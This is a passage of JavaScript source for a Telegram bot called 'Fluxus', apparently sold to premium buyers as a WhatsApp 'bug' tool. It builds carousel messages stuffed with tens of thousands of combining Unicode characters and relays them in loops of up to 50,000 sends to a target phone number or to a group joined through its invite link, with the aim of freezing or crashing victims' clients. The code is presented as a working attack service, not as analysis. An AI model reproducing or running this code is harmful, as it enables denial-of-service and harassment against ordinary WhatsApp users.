            body: { text: " -‣  -‣⎋⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉ -‣  -‣" + "ꦾ".repeat(30000) },
            footer: { text: "⎋⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉ -‣   -‣" },
            header: { hasMediaAttachment: false },
            carouselMessage: { cards }
          }
        }
      }
    }, {});
    const sent = await sock.relayMessage(target, carousel.message, {
      messageId: carousel.key.id
    });
    console.log(`Succes Sending Bug to ${target}`);
  }

//================= LOOPING SENDING BUG ====================//
async function Shifter(sock, jid) {
  for (let i = 0; i < 10; i++) {
  await Cursed(jid)
  console.clear();
  console.log(chalk.blue(`🫀 SendBug By Bot`));
  }
  }

async function Basicly(sock, jid) {
  for (let i = 0; i < 10000; i++) {
  await TraVisZap(sock, jid, true);
  await callinvisible(sock, jid)
  await Xextend1(sock, jid)
  await TraVisZap(sock, jid, true);
  await callinvisible(sock, jid)
  await Xextend1(sock, jid)
  console.clear();
  console.log(chalk.blue(`🫀 SendBug By Bot`));
    }
  }
  
async function Diedd(sock, jid) {
  for (let i = 0; i < 50000; i++) {
  await korbanFuncKefix(sock, jid, false);
  await korbanFuncKefix2(sock, jid, false);
  await korbanFuncKefix(sock, jid, false);
  await korbanFuncKefix2(sock, jid, false);
  console.clear();
  console.log(chalk.blue(`🫀 SendBug By Bot`));
  }
  }

//// ---------------[start]--------------
bot.onText(/\/start/, (msg) => {
    // Pastikan fungsi getUptime() sudah didefinisikan di bagian lain kode Anda
    const userId = msg.from.id;
    const photoUrl = "https://files.catbox.moe/mlo5v8.png";
    const chatId = msg.chat.id;
    const date = getCurrentDate();
    
    const captionText = `
<blockquote>╔─═⊱ FLUXUS - VIP ─═⬡
┃ Developer : Danzz
║ Developer2 : Shedow
┃ Version : 2.0
╰━━━━━━━━━━━━━━━─═⬡
╔─═⊱ USER INFO ─═⬡
║ Pengguna : ${msg.from.first_name}
┃ Id User : ${userId}
║ Date now : ${date}
╰━━━━━━━━━━━━━━━─═⬡
╔─═⊱  INFORMATION ━━━═⬡
┃ Want Using? If You Have Access
┃ Use This ( /menu )
╰━━━━━━━━━━━━━━━─═⬡</blockquote>
<blockquote>WANT BUY? CONTACT OWNER</blockquote>`;

    bot.sendPhoto(chatId, photoUrl, {
        caption: captionText,
        parse_mode: 'HTML', // Menggunakan Html untuk format yang lebih standar
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: "⌜ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝 𝙾𝚠𝚗𝚎𝚛 ⌟",
                        url: `https://t.me/${OWNER_1}`,
                    },
                    {
                        text: "⌜ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝 𝙾𝚠𝚗𝚎𝚛 𝟸 ⌟",
                        url: `https://t.me/${OWNER_2}`,
                    },
                ],
                [
                    {
                        text: "⌜ 𝙵𝚕𝚞𝚡𝚞𝚜 ☇ 𝙲𝚑𝚊𝚗𝚗𝚎𝚕 ⌟", 
                        url: "https://t.me/FluxusInform"
                    },
                ],
            ],
        }
    });
});


/////---------------[sleep function]------_-_
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}
const bugRequests = {};
bot.onText(/\/menu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>у нас нет доступа ( ☄️ ).</blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "⌜ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝 𝙾𝚠𝚗𝚎𝚛 ⌟",
              url: `https://t.me/${OWNER_1}`,
            },
            {
              text: "⌜ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝 𝙾𝚠𝚗𝚎𝚛 𝟸 ⌟",
              url: `https://t.me/${OWNER_2}`,
            },
          ],
        ],
      },
    });
  }
  bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>( 🕊️ ) - Привет, друзья, я здесь. Verow Рекомендую скрипт Bug bot Telegram С различными функциями!!!
#MarkBlack⚡

 ( 𖥊 ) Fluxus˚ ☇ Cookie ☨
 □ Author : DanzzyXMark ☨ ( 🫀 )
 □ Version : 2.0 Atomic
 □ Name Bot : Fluxus
 □ Libray : Telegraf 
 □ Type : ( Case - Plugins )
 □ League : Asia/Sumatra-
 □ Date now : ${date}</blockquote>
<blockquote>( 🤍 ) Aku mencintaimu seperti kamu mencintaiku 🫀
© Fluxus˚ ☇ Cookie</blockquote>
<blockquote>( 🍁 ) Press Button Menu!!!</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "⌜ 𝙵𝚕𝚞𝚡𝚞𝚜 ☇ 𝙱𝚞𝚐 ⌟",
            callback_data: "bugmenu",
          },
          {
            text: "⌜ 𝚃𝚑𝚊𝚗𝚔𝚜° ☇ 𝚃𝚘 ⌟",
            callback_data: "thanksto",
          },
          {
            text: "⌜ 𝙵𝚕𝚞𝚡𝚞𝚜 ☇ 𝙰𝚌𝚌𝚎𝚜𝚜 ⌟",
            callback_data: "ownermenu",
          },
        ],
        [
          {
            text: "⌜ 𝙵𝚕𝚞𝚡𝚞𝚜 ☇ 𝙲𝚑𝚊𝚗𝚗𝚎𝚕 ⌟", 
            url: "https://t.me/FluxusInform"
        },
      ],
     ],
    },
  });
});
bot.on("callback_query", (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const newImage = getRandomImage();
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  let newCaption = "";
  let newButtons = [];
  if (data === "bugmenu") {
    newCaption = `<blockquote>( 🕊️ ) - Марк Фак Кибер будет следить за   тобой все время!!!!Mark Fak Cyber akan mengawasi Anda sepanjang waktu!!!!
#MarkBlack⚡

( 🧪 ) INVISIBLE FITURE 
┌───────◌
├───◌ ( ☄️ ) DELAY INVISIBLE
├─◌ Delay Super Bot Fixed Until Stop
├─────◌
├──◌ /Vorius - 62xxx
└───────◌

┌───────◌
├───◌ ( 🍁 ) DELAY 80%
├─◌ invisible no kenon
├─────◌
├──◌ /GeForce - 62xxx
└───────◌

 ( ☄️) FIXEDBUG 
┌───────◌
├───◌ ( 🍂 ) FIXEDBUG 
├─◌ Membersihkan Virus/Virtex
├─────◌
├──◌ /fixedbug - 62xxx
└───────◌
</blockquote>`;
    newButtons = [
      [
        {
          text: "⌜ 𝙱𝚊𝚌𝚔 ⌟",
          callback_data: "mainmenu",
        },
      ],
      [ {
         text: "⌜ 𝙽𝚎𝚡𝚝 𝙱𝚞𝚐 ⌟",
         callback_data: "bugmenu2",
        },
      ],
    ];
  } else if (data === "bugmenu2") {
    newCaption = `<blockquote>( 🕊️ ) - Марк Фак Кибер будет следить за   тобой все время!!!!
#MarkBlack⚡

( 🧪 ) NON INVISIBLE FITURE 
┌───────◌
├───◌ ( ☘️ ) FREEZE GROUP
├─◌ Combo All Function Bug Group
├─────◌
├──◌ /Killgrup - LinkGroup
└───────◌

┌───────◌
├───◌ ( 💐 ) DELAY 1 HOUR
├─◌ Invisible/kenon
├─────◌
├──◌ /Evorger - 62xxx
└───────◌
</blockquote>`;
    newButtons = [
      [
        {
          text: "⌜ 𝙱𝚊𝚌𝚔 ⌟",
          callback_data: "bugmenu",
        },
      ],
    ];
  } else if (data === "ownermenu") {
    newCaption = `<blockquote>( 🕊️ ) - Марк Фак Кибер будет следить за   тобой все время!!!!
#MarkBlack⚡

┌─────◌ ( ☄️) Akses Fiture
├─────◌
├──◌ /addprem - id ☇ days
├─────◌
├──◌ /delprem - id
├─────◌
├──◌ /addadmin - id
├─────◌
├──◌ /deladmin - id
├─────◌
├──◌ /listprem
├─────◌
├──◌ /addsender - 62xxx
└───────◌
</blockquote>`;
    newButtons = [
      [
        {
          text: "⌜ 𝙱𝚊𝚌𝚔 ⌟",
          callback_data: "mainmenu",
        },
      ],
    ];
  } else if (data === "thanksto") {
    newCaption = `<blockquote>( 🕊️ ) - Марк Фак Кибер будет следить за   тобой все время!!!!
#MarkBlack⚡

 ( 𖥊 ) Thanks ☇ Too
 □ Danzz ( Developer )
 □ Cikoo ( Developer 2 )
 □ Callzwhy ( My Support )
 □ Darkness ( My Support )
 □ All Buyer ( Support )
 □ thanks for dark angel n show of bug
</blockquote>`;
    newButtons = [
      [
        {
          text: "⌜ 𝙱𝚊𝚌𝚔 ⌟",
          callback_data: "mainmenu",
        },
      ],
    ];
  } else if (data === "mainmenu") {
    newCaption = `<blockquote>( 🕊️ ) - Привет, друзья, я здесь. Verow Рекомендую скрипт Bug bot Telegram С различными функциями!!!
#MarkBlack⚡

( 𖥊 ) Fluxus˚ ☇ Cookie
 □ Author : DanzzyXMark ☨ ( 🫀 )
 □ Version : 2.0 Atomic
 □ Name Bot : Fluxus
 □ Libray : Telegraf 
 □ Type : ( Case - Plugins )
 □ League : Asia/Sumatra-
 □ Date now : ${date}</blockquote>
<blockquote>( 🤍 ) Aku mencintaimu seperti kamu mencintaiku 🫀
© Fluxus˚ ☇ Cookie</blockquote>
<blockquote>( 🍁 ) Press Button Menu!!!</blockquote>
`;
    newButtons = [
      [
          {
            text: "⌜ 𝙵𝚕𝚞𝚡𝚞𝚜° ☇ 𝙱𝚞𝚐 ⌟",
            callback_data: "bugmenu",
          },
          {
            text: "⌜ 𝚃𝚑𝚊𝚗𝚔𝚜° ☇ 𝚃𝚘 ⌟",
            callback_data: "thanksto",
          },
          {
            text: "⌜ 𝙵𝚕𝚞𝚡𝚞𝚜° ☇ 𝙰𝚌𝚌𝚎𝚜𝚜 ⌟",
            callback_data: "ownermenu",
          },
      ],
      [
          {
            text: "⌜ 𝙵𝚕𝚞𝚡𝚞𝚜° ☇ 𝙲𝚑𝚊𝚗𝚗𝚎𝚕 ⌟", 
            url: "https://t.me/FluxusInform"
          },
        ],
    ];
  }
  bot
    .editMessageMedia(
      {
        type: "photo",
        media: newImage,
        caption: newCaption,
        parse_mode: "HTML",
      },
      {
        chat_id: chatId,
        message_id: messageId,
      }
    )
    .then(() => {
      bot.editMessageReplyMarkup(
        {
          inline_keyboard: newButtons,
        },
        {
          chat_id: chatId,
          message_id: messageId,
        }
      );
    })
    .catch((err) => {
      console.error("Error editing message:", err);
    });
});

//// -------------- ( CASE BUG ) -------------- \\\\
bot.onText(/\/Killgrup(?:\s(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = msg.text.split(" ");
  const groupLink = args[1] ? args[1].trim() : null;

  if (!groupLink) {
    return bot.sendMessage(chatId, `Example: Killgrup <link>`);
  }

  const sock = sessions.values().next().value;

  async function joinAndSendBug(groupLink) {
    try {
      const groupCode = extractGroupID(groupLink);
      if (!groupCode) {
        await bot.sendMessage(chatId, "Link grup tidak valid");
        return false;
      }

      try {
        const groupId = await sock.groupGetInviteInfo(groupCode);
        for (let i = 0; i < 10; i++) {
          await Overgroup(sock, groupId.id);
